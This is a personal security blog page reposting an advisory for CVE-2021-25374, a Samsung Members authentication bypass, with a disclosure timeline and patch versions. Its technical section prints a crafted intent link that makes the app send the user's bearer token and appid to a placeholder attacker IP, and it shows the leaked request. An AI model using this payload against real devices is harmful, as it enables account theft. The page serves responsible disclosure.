<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>CVE-2021-25374 Details | YayWebsiteYay (I suck at titles)</title>
<meta name="generator" content="Jekyll v3.9.0" />
<meta property="og:title" content="CVE-2021-25374 Details" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Sometimes I want to publish stuff unfiltered." />
<meta property="og:description" content="Sometimes I want to publish stuff unfiltered." />
<link rel="canonical" href="http://localhost:4000/cves/cve-2021-25374" />
<meta property="og:url" content="http://localhost:4000/cves/cve-2021-25374" />
<meta property="og:site_name" content="YayWebsiteYay (I suck at titles)" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="CVE-2021-25374 Details" />
<script type="application/ld+json">
{"@type":"WebPage","headline":"CVE-2021-25374 Details","url":"http://localhost:4000/cves/cve-2021-25374","description":"Sometimes I want to publish stuff unfiltered.","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="YayWebsiteYay (I suck at titles)" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">YayWebsiteYay (I suck at titles)</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/published-research/">Published Research</a><a class="page-link" href="/cves/">My CVEs</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post">

  <header class="post-header">
    <h1 class="post-title">CVE-2021-25374 Details</h1>
  </header>

  <div class="post-content">
    <h4 id="original-post-httpslabsf-securecomadvisoriessamsung-s20-gain-access-to-samsung-account">Original post: <a href="https://labs.f-secure.com/advisories/samsung-s20-gain-access-to-samsung-account/">https://labs.f-secure.com/advisories/samsung-s20-gain-access-to-samsung-account/</a></h4>

<table>
  <tbody>
    <tr>
      <td><strong>Product</strong></td>
      <td>Samsung phones with Samsung Members (version dependent on OS)</td>
    </tr>
    <tr>
      <td><strong>Severity</strong></td>
      <td>High</td>
    </tr>
    <tr>
      <td><strong>CVE Reference</strong></td>
      <td>CVE-2021-25374</td>
    </tr>
    <tr>
      <td><strong>Type</strong></td>
      <td>Authentication Bypass</td>
    </tr>
  </tbody>
</table>

<h2 id="description">Description</h2>

<p>F-Secure looked into exploiting the Samsung S20 device for Tokyo Pwn2Own 2020. An issue was discovered that would have allowed an attacker to gain access to the victim’s Samsung Account.</p>

<h2 id="technical-details">Technical Details</h2>

<p>Samsung Members (com.samsung.android.voc) is an application which offers tips and solutions for Samsung device owners. For US and South Korean users, the app also offers a portal to login to Samsung Members, the official Samsung loyalty program.</p>

<p>A webview within the Samsung Rewards section of the application could be used to obtain access to someone’s Samsung account. The following launchable intent could be used to replicate this issue:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;a href="intent://launch?url=http://&lt;attacker IP&gt;:8000/yay.html&amp;action=sso&amp;from=ZZ&amp;iso=ZZ#Intent;scheme=samsungrewards;package=com.samsung.android.voc;action=android.intent.action.VIEW;end;"&gt;yay click here yay&lt;/a&gt;
</code></pre></div></div>

<p>Users that have a vulnerable version of Samsung Members installed are at risk of having their Samsung Account compromised via the above browsable link. After tapping the above link on a vulnerable phone, the application will make a HTTP request similar to the following, which contains the user’s authorization bearer token and appid. In this scenario, an attacker controls the IP address located at “<attacker IP="">":</attacker></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /yay.html HTTP/1.1
Host: &lt;attacker IP&gt;:8000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G985F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
authorization: Bearer &lt;bearer value&gt;
x-osp-appid: &lt;appid value&gt;
X-Requested-With: com.samsung.android.voc
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
</code></pre></div></div>

<p>Using these two pieces of information, it is possible for an attacker to make a series of requests that would give the attacker access to the user’s Samsung Account. F-Secure developed a Python Proof of Concept (PoC) script that would automate the series of requests and print the account’s profile information. The screenshot below shows the PoC script in action (left) and what the phone displays during exploitation (right):</p>

<p><img src="/assets/my_cves/cve-2021-25374_1.png" alt="yay" /></p>

<p>The PoC script can be found on F-Secure’s GitHub page at <a href="https://github.com/Yogehi/CVE-2021-25374_Samsung-Account-Access">https://github.com/Yogehi/CVE-2021-25374_Samsung-Account-Access</a>.</p>

<h2 id="remedial-action">Remedial Action</h2>

<p>Samsung has released patched versions of Samsung Members which addresses the above issue. The version that should be downloaded depends on the OS of the device itself.</p>

<ul>
  <li>Devices running Android O (8.1) and below should download Samsung Members version 2.4.83.9 or above</li>
  <li>Devices running Android P (9.0) and above should download Samsung Members version 3.9.00.9 or above</li>
</ul>

<h2 id="credits">Credits</h2>

<p>This issue was discovered by Ken Gannon.</p>

<h2 id="timeline">Timeline</h2>

<table>
  <tbody>
    <tr>
      <td><strong>Date</strong></td>
      <td><strong>Summary</strong></td>
    </tr>
    <tr>
      <td>03/10/2020</td>
      <td>Issue disclosed to Samsung Mobile Security</td>
    </tr>
    <tr>
      <td>03/10/2020</td>
      <td>Issue assigned to a Samsung Security Analyst</td>
    </tr>
    <tr>
      <td>25/10/2020</td>
      <td>Samsung confirms the vulnerability and rates it as a high risk issue</td>
    </tr>
    <tr>
      <td>11/01/2021</td>
      <td>Follow up sent to Samsung</td>
    </tr>
    <tr>
      <td>11/01/2021</td>
      <td>Samsung responded to follow up saying a patch is still being worked on</td>
    </tr>
    <tr>
      <td>06/04/2021</td>
      <td>Patch released, Samsung initiates process for bug bounty reward</td>
    </tr>
    <tr>
      <td>06/04/2021</td>
      <td>CVE Assigned</td>
    </tr>
    <tr>
      <td>28/04/2021</td>
      <td>Advisory Published</td>
    </tr>
  </tbody>
</table>

  </div>

</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">YayWebsiteYay (I suck at titles)</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">YayWebsiteYay (I suck at titles)</li><li><a class="u-email" href="mailto:Fake_email_link">Fake_email_link</a></li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/yogehi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">yogehi</span></a></li><li><a href="https://www.twitter.com/yogehi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">yogehi</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Sometimes I want to publish stuff unfiltered.</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
